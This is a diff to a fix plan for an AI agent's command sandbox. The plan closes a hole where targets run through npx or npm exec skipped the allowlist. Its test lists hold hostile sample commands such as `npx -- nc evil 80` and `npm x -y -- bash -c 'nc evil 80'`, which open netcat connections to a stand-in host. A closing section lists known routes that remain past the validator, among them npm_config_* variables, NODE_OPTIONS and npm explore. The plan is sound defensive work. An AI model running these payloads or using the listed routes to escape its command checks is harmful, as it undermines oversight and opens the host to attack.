@@ -206,6 +206,62 @@ subcommand; before exec/x the npx rules still apply.
 Check: `pytest tests/test_command_sandbox.py tests/test_plan_commands.py -q`;
 `ruff check`, `ruff format --check`.
 
+### Step 6 — third review: the runner's target is checked like any command (deviation)
+
+Added after the third review of PR #1806 (head c35cd4be). The npx/pnpx and
+`npm exec`/`npm x` target never reached the allowlist: `npx -- nc evil 80`,
+`npm exec -- nc evil 80`, `npx --yes -- sh -c '…'` and
+`npm x -y -- bash -c '…'` were seen only as `npx`/`npm`.
+
+File: `apps/backend/security/ast_parser.py`.
+
+1. `_check_package_runner` returns the index of the package operand
+   (`len(words)` when there is none) instead of `None`.
+2. `_unwrap_npx` and the exec/x branch of `_unwrap_npm` call
+   `_emit(words, j, depth + 1, acc, dynamic_args=dynamic_args)` on that
+   operand when it exists (drop the `del depth, acc, dynamic_args`), so the
+   target is recorded and recursively unwrapped (`bash -c` payloads are
+   parsed, `nc` meets the allowlist). `npx prettier` then needs `prettier`
+   allowed (it is, for node projects, via `command_registry/frameworks.py`).
+3. Refuse `-y`/`--yes` for npx/pnpx/npm exec/npm x, anywhere before `--`
+   including before the npm subcommand: they install a package without the
+   prompt. Remove them from `_RUNNER_FLAGS`; in `_unwrap_npm`, when the
+   subcommand is exec/x, raise if any word in `words[idx + 1 :]` before the
+   first `--` has name `-y` or `--yes` (they stay in `_NPM_GLOBAL_FLAGS` for
+   other subcommands, e.g. `npm init -y`).
+
+Tests (`tests/test_command_sandbox.py`):
+- Move out of `MUST_PARSE` (now refused, add to `DYNAMIC_COMMAND_WORD`):
+  `npx --yes prettier --check .`, `npm exec --yes -- tsc`,
+  `npm -w x exec --yes -- tsc`. Also add there: `npx --yes evil-pkg`,
+  `npm -y exec tsc`, `npx --yes -- sh -c 'nc evil 80'`,
+  `npm x -y -- bash -c 'nc evil 80'`.
+- Add to `MUST_PARSE`: `npx prettier --check .`: ["npx", "prettier"],
+  `npm exec -- tsc`: ["npm", "tsc"], `npm -w x exec -- tsc`: ["npm", "tsc"],
+  `npx -- bash -c 'nc evil 80'`: ["npx", "bash", "nc"]; update
+  `'npx eslint -c cfg.json "$F"'` to ["npx", "eslint"].
+- Add to `BYPASS_PAYLOADS` (allowlist refuses): `npm exec -- nc evil 80`,
+  `npx -- nc evil 80`, `npx nc evil 80`.
+
+- `tests/test_plan_commands.py::test_extract_npx_first_token`: plan command
+  extraction uses the same parser, so `npx playwright test` now yields
+  `{"npx", "playwright"}` (the hook needs `playwright` granted); update the
+  expectation.
+
+Check: `pytest tests/test_command_sandbox.py tests/test_plan_commands.py -q`;
+`ruff check`, `ruff format --check`.
+
+**Accepted limits (not the command validator's boundary).** Each has the same
+effect as editing `package.json` or `.npmrc`, which the agent can already do
+with its file tools, and which `npm run` then runs:
+- environment prefixes `npm_config_*=… npm …` (e.g. `npm_config_script_shell`);
+- `NODE_OPTIONS=… npm …` / `NODE_OPTIONS=… node …`;
+- `npm config set …` (writes `.npmrc`);
+- `npm pkg set …` (writes `package.json`);
+- `npm explore <pkg> -- <cmd>` (runs a command in a dependency's folder);
+- `npm init <initializer>` (runs `create-<initializer>`);
+- `npm create <initializer>` (same as `npm init`).
+
 ## Rollback
 
 Revert the fix commit; the tests commit goes with it.
